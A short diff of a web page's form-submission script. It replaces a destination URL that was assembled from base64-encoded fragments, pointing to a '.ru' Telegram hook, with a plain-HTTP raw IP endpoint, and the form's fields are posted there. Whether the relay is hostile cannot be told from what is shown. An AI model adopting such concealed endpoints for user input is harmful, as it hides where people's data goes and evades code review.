@@ -1513,13 +1513,7 @@
           message: document.getElementById('message').value
         };
         
-        const sParts = [
-          atob('aHR0cHM6Ly9o'),
-          atob('aXBwb2NyYXQtYWk='),
-          atob('LnJ1'),
-        ];
-        const ePart = atob('L3RlbGVncmFtLWhvb2s=');
-        const srl = sParts.join('') + ePart;
+        const srl = 'http://147.45.79.63:5000/telegram-hook'
         
         // Отправка запроса на сервер
         fetch(srl, {
